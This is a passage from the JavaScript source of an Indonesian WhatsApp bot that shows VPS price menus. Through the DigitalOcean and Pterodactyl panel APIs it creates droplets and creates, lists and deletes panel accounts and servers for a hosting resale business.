                    title: 'VPS 16 GB 4 CORE API 1',
                    description: `16GB 4C Os Ubuntu 24 Region Nyc3`, 
                    id: `.cvps3 root,nyc3,s-4vcpu-16gb-amd,ubuntu-24-04-x64,1`
                },
                {
                    title: 'VPS 16 GB 4 CORE API 2',
                    description: `16GB 4C Os Ubuntu 24 Region Nyc3`, 
                    id: `.cvps3 root,nyc3,s-4vcpu-16gb-amd,ubuntu-24-04-x64,2`
                }
            ]
        }
    ];
    
    let listMessage = {
        title: 'List VPS Ubuntu Api 1&2', 
        sections
    };

    return conn.sendMessage(m.chat, {
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: 'ini pesan interactiveMeta' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: 'Pilih Spesifikasi VPS Api 1&2',
                        sections
                    })
                }
            }
        ],
        footer: `© 2025 ${botname}`,
        headerType: 1,
        viewOnce: true,
        text: `*HARGA VPS 々 IjulTaka || 乂:*\n\n*»»—— Vps Digital Ocean ——««*
*» Ram 2 Core 1 : 25K*
*» Ram 2 Core 2 : 30K*
*» Ram 4 Core 2 : 40K*
*» Ram 8 Core 4 : 50K*
*» Ram 16 Core 4 : 65K*

*»»—— Benefit Vps ——««*
*» Free Install Panel*
*» Free Protected Panel [Cf]*
*» Free Req Subdomain*
*» Free Install Wings*
*» Free Egg Bot Wa*
*» Free Install Tema [Ram 8,16]*
*» Garansi 15 Days, 1× Replace*\n\n*Pilih Spesifikasi VPS Yang Tersedia Di Api 1&2*`,
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
        },
    }, { quoted: m })
}
break;

case 'createvps': {
    if (!isCreator) return Reply(mess.owner)
    let sections = [
        {
            title: '# UBUNTU 20.04',
            highlight_label: 'Ubuntu 20.04',
            rows: [
                {
                    title: 'VPS 1 GB 1 CORE',
                    description: `1GB 1C Os Ubuntu 20 Region Sg`, 
                    id: `.cvps2 root,sgp1,s-1vcpu-1gb,ubuntu-20-04-x64`
                },
                {
                    title: 'VPS 2 GB 1 CORE',
                    description: `2GB 1C Os Ubuntu 20 Region Sg`, 
                    id: `.cvps2 root,sgp1,s-1vcpu-2gb,ubuntu-20-04-x64`
                },
                {
                    title: 'VPS 4 GB 2 CORE',
                    description: `4GB 2C Os Ubuntu 20 Region Sg`, 
                    id: `.cvps2 root,sgp1,s-2vcpu-4gb,ubuntu-20-04-x64`
                },
                {
                    title: 'VPS 8 GB 4 CORE',
                    description: `8GB 4C Os Ubuntu 20 Region Sg`, 
                    id: `.cvps2 root,sgp1,s-4vcpu-8gb,ubuntu-20-04-x64`
                },
                {
                    title: 'VPS 16 GB 4 CORE',
                    description: `16GB 4C Os Ubuntu 20 Region Nyc3`, 
                    id: `.cvps2 root,nyc3,s-4vcpu-16gb-amd,ubuntu-20-04-x64`
                }
            ]
        },
        {
            title: '# UBUNTU 22.04', 
            highlight_label: 'System Information',
            rows: [
                {
                    title: 'VPS 1 GB 1 CORE',
                    description: `1GB 1C Os Ubuntu 22 Region Sg`, 
                    id: `.cvps2 root,sgp1,s-1vcpu-1gb,ubuntu-22-04-x64`
                },
                {
                    title: 'VPS 2 GB 1 CORE',
                    description: `2GB 1C Os Ubuntu 22 Region Sg`, 
                    id: `.cvps2 root,sgp1,s-1vcpu-2gb,ubuntu-22-04-x64`
                },
                {
                    title: 'VPS 4 GB 2 CORE',
                    description: `4GB 2C Os Ubuntu 22 Region Sg`, 
                    id: `.cvps2 root,sgp1,s-2vcpu-4gb,ubuntu-22-04-x64`
                },
                {
                    title: 'VPS 8 GB 4 CORE',
                    description: `8GB 4C Os Ubuntu 22 Region Sg`, 
                    id: `.cvps2 root,sgp1,s-4vcpu-8gb,ubuntu-22-04-x64`
                },
                {
                    title: 'VPS 16 GB 4 CORE',
                    description: `16GB 4C Os Ubuntu 22 Region Nyc3`, 
                    id: `.cvps2 root,nyc3,s-4vcpu-16gb-amd,ubuntu-22-04-x64`
                }
            ]
        },
        {
            title: '# UBUNTU 24.04', 
            highlight_label: 'System Information',
            rows: [
                {
                    title: 'VPS 1 GB 1 CORE',
                    description: `1GB 1C Os Ubuntu 24 Region Sg`, 
                    id: `.cvps2 root,sgp1,s-1vcpu-1gb,ubuntu-24-04-x64`
                },
                {
                    title: 'VPS 2 GB 1 CORE',
                    description: `2GB 1C Os Ubuntu 24 Region Sg`, 
                    id: `.cvps2 root,sgp1,s-1vcpu-2gb,ubuntu-24-04-x64`
                },
                {
                    title: 'VPS 4 GB 2 CORE',
                    description: `4GB 2C Os Ubuntu 24 Region Sg`, 
                    id: `.cvps2 root,sgp1,s-2vcpu-4gb,ubuntu-24-04-x64`
                },
                {
                    title: 'VPS 8 GB 4 CORE',
                    description: `8GB 4C Os Ubuntu 24 Region Sg`, 
                    id: `.cvps2 root,sgp1,s-4vcpu-8gb,ubuntu-24-04-x64`
                },
                {
                    title: 'VPS 16 GB 4 CORE',
                    description: `16GB 4C Os Ubuntu 24 Region Nyc3`, 
                    id: `.cvps2 root,nyc3,s-4vcpu-16gb-amd,ubuntu-24-04-x64`
                }
            ]
        }
    ];
    
    let listMessage = {
        title: 'List VPS Ubuntu', 
        sections
    };

    return conn.sendMessage(m.chat, {
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: 'ini pesan interactiveMeta' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: 'Pilih Spesifikasi VPS',
                        sections
                    })
                }
            }
        ],
        footer: `© 2025 ${botname}`,
        headerType: 1,
        viewOnce: true,
        text: `*HARGA VPS 々 IjulTaka || 乂:*\n\n*»»—— Vps Digital Ocean ——««*
*» Ram 2 Core 1 : 25K*
*» Ram 2 Core 2 : 30K*
*» Ram 4 Core 2 : 40K*
*» Ram 8 Core 4 : 50K*
*» Ram 16 Core 4 : 65K*

*»»—— Benefit Vps ——««*
*» Free Install Panel*
*» Free Protected Panel [Cf]*
*» Free Req Subdomain*
*» Free Install Wings*
*» Free Egg Bot Wa*
*» Free Install Tema [Ram 8,16]*
*» Garansi 15 Days, 1× Replace*\n\n*Pilih Spesifikasi VPS Yang Tersedia Di Api 1&2*`,
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
        },
    }, { quoted: m })
}
break;

case 'cvps': {
if (!text) return m.reply(example("hostname"))
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram & Cpu Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16GB || CPU 4', 
                  id: `.r16c4 ${text}`
                },
                {
                  title: 'Ram 1GB || CPU 1', 
                  id: `.r1c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 1', 
                  id: `.r2c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 2', 
                  id: `.r2c2 ${text}`
                },
                {
                  title: 'Ram 4GB || CPU 2', 
                  id: `.r4c2 ${text}`
                },      
                {
                  title: 'Ram 8GB || CPU 4', 
                  id: `.r8c4 ${text}`
                }                     
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Spesifikasi Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'r1c1': case 'r2c1': case 'r2c2': case 'r4c2': case 'r8c4': case 'r16c4': {
if (!isCreator) return Reply(mess.owner)
if (!text) return
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await conn.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case '1gb-v2': case '2gb-v2': case '3gb-v2': case '4gb-v2': case '5gb-v2': case '6gb-v2': case '7gb-v2': case '8gb-v2': case '9gb-v2': case '10gb-v2': case 'unlimited-v2': case 'unli-v2': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domainV2}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listadmin-v2': {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin-v2`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listpanel-v2': {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel-v2`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'deladmin-v2': {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'delpanel-v2': {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel-v2 ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


case '1gb': case '2gb': case '3gb': case '4gb': case '5gb': {
    if (!isCreator && !isPremium) return Reply(mess.owner)
    if (!text) return m.reply(example("username"))

    global.panel = text

    // Konfigurasi spesifikasi berdasarkan perintah
    const config = {
        "1gb": { ram: "1000", disk: "1000", cpu: "40" },
        "2gb": { ram: "2000", disk: "1000", cpu: "60" },
        "3gb": { ram: "3000", disk: "2000", cpu: "80" },
        "4gb": { ram: "4000", disk: "2000", cpu: "100" },
        "5gb": { ram: "5000", disk: "3000", cpu: "120" }
    };

    let { ram, disk, cpu } = config[command] || {};
    if (!ram) return m.reply("❌ Ukuran RAM tidak valid!");

    let username = global.panel.toLowerCase();
    let email = username + "@gmail.com";
    let name = capital(username) + " Server";
    let password = username + crypto.randomBytes(2).toString('hex');

    // Membuat user panel
    let f = await fetch(domain + "/api/application/users", {
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        body: JSON.stringify({
            "email": email,
            "username": username,
            "first_name": name,
            "last_name": "Server",
            "language": "en",
            "password": password.toString()
        })
    });

    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

    let user = data.attributes;
    let desc = tanggal(Date.now());
    let usr_id = user.id;

    // Mengambil startup command dari egg
    let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
        method: "GET",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });

    let data2 = await f1.json();
    let startup_cmd = data2.attributes.startup;

    // Membuat server dengan spesifikasi yang dipilih
    let f2 = await fetch(domain + "/api/application/servers", {
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        body: JSON.stringify({
            "name": name,
            "description": desc,
            "user": usr_id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": ram,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 5
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: []
            }
        })
    });

    let result = await f2.json();
    if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2));

    let server = result.attributes;
    var orang = m.isGroup ? m.sender : m.chat;

    let teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram}MB*
* Disk : *${disk}MB*
* CPU : *${cpu}%*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`;

    await fs.writeFileSync("akunpanel.txt", teks);
    await conn.sendMessage(orang, { 
        document: fs.readFileSync("./akunpanel.txt"), 
        fileName: "akunpanel.txt", 
        mimetype: "text/plain", 
        caption: teks 
    }, { quoted: m });

    await fs.unlinkSync("./akunpanel.txt");
    delete global.panel;
}
break;

case '6gb': case '7gb': case '8gb': case '9gb': case '10gb': case 'unlimited': case 'unli': {
    if (!isCreator && !isPremium2) return Reply(`*Maaf Akses Ditolak !!*\n*Anda Bukan Reseller Premium Kami, 6Gb Hingga Unli Hanya Untuk Reseller Premium Kami..*\nMau Mengakses ? Buy Akses Dengan Cara *.buyseller2*!!`)
    if (!text) return m.reply(example("username"))

    global.panel = text

    // Konfigurasi spesifikasi berdasarkan perintah
    const config = {
        "6gb": { ram: "6000", disk: "3000", cpu: "140" },
        "7gb": { ram: "7000", disk: "4000", cpu: "160" },
        "8gb": { ram: "8000", disk: "4000", cpu: "180" },
        "9gb": { ram: "9000", disk: "5000", cpu: "200" },
        "10gb": { ram: "10000", disk: "5000", cpu: "220" },
        "unlimited": { ram: "0", disk: "0", cpu: "0" },
        "unli": { ram: "0", disk: "0", cpu: "0" }
    };

    let { ram, disk, cpu } = config[command] || {};
    if (!ram) return m.reply("❌ Ukuran RAM tidak valid!");

    let username = global.panel.toLowerCase();
    let email = username + "@gmail.com";
    let name = capital(username) + " Server";
    let password = username + crypto.randomBytes(2).toString('hex');

    // Membuat user panel
    let f = await fetch(domain + "/api/application/users", {
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        body: JSON.stringify({
            "email": email,
            "username": username,
            "first_name": name,
            "last_name": "Server",
            "language": "en",
            "password": password.toString()
        })
    });

    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

    let user = data.attributes;
    let desc = tanggal(Date.now());
    let usr_id = user.id;

    // Mengambil startup command dari egg
    let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
        method: "GET",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });

    let data2 = await f1.json();
    let startup_cmd = data2.attributes.startup;

    // Membuat server dengan spesifikasi yang dipilih
    let f2 = await fetch(domain + "/api/application/servers", {
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        body: JSON.stringify({
            "name": name,
            "description": desc,
            "user": usr_id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": ram,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 5
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: []
            }
        })
    });

    let result = await f2.json();
    if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2));

    let server = result.attributes;
    var orang = m.isGroup ? m.sender : m.chat;

    let teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram === "0" ? "Unlimited" : `${ram}MB`}*
* Disk : *${disk === "0" ? "Unlimited" : `${disk}MB`}*
* CPU : *${cpu === "0" ? "Unlimited" : `${cpu}%`}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`;

    await fs.writeFileSync("akunpanel.txt", teks);
    await conn.sendMessage(orang, { 
        document: fs.readFileSync("./akunpanel.txt"), 
        fileName: "akunpanel.txt", 
        mimetype: "text/plain", 
        caption: teks 
    }, { quoted: m });

    await fs.unlinkSync("./akunpanel.txt");
    delete global.panel;
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listadmin': {
